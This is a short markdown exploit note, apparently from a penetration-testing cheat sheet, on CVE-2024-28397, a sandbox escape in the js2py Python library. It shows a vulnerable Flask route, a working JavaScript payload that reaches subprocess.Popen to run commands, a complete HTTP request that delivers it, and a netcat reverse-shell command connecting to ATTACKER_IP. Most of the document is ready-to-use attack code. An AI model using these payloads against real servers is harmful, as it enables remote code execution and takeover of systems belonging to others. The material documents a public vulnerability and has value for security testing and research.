# js2py

js2py is a Python library that translates JavaScript to Python and allows executing JavaScript code within Python using `js2py.eval_js()`.

## CVE-2024-28397 - Sandbox Escape / RCE

**Vulnerable Function:** `js2py.eval_js()`

When a web application uses js2py to evaluate user-controlled JavaScript, it's vulnerable to sandbox escape leading to arbitrary Python code execution.

### Detection

Look for Flask/Python apps evaluating JavaScript:

```python
# Vulnerable code pattern
@app.route('/run_code', methods=['POST'])
def run_code():
    code = request.json.get('code')
    result = js2py.eval_js(code)  # VULNERABLE
    return jsonify({'result': result})
```

### Exploitation

**Sandbox Escape POC:**

```javascript
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
output = findpopen(obj)("id", -1, null, -1, -1, -1, null, null, true).communicate()
console.log(output)
```

**Request Example:**

```http
POST /run_code HTTP/1.1
Host: target:8000
Content-Type: application/json
Cookie: session=...

{"code":"function findpopen(o) {\n    let result;\n    for(let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i]\n        if(item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") {\n            return item\n        }\n        if(item.__name__ != \"type\" && (result = findpopen(item))) {\n            return result\n        }\n    }\n}\n\nlet obj = Object.getOwnPropertyNames({}).__getattribute__(\"__getattribute__\")(\"__class__\").__base__\noutput = findpopen(obj)(\"id\", -1, null, -1, -1, -1, null, null, true).communicate()\nconsole.log(output)"}
```

**Reverse Shell:**

Replace the command with:

```javascript
output = findpopen(obj)("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 9001 >/tmp/f", -1, null, -1, -1, -1, null, null, true).communicate()
```

### References

- https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape
- https://sploitus.com/exploit?id=B2D67207-FDF4-57B3-B988-6C0DAD550C22
- https://gist.github.com/win3zz/159610d3269f39f66a4da5ddf5150e2d
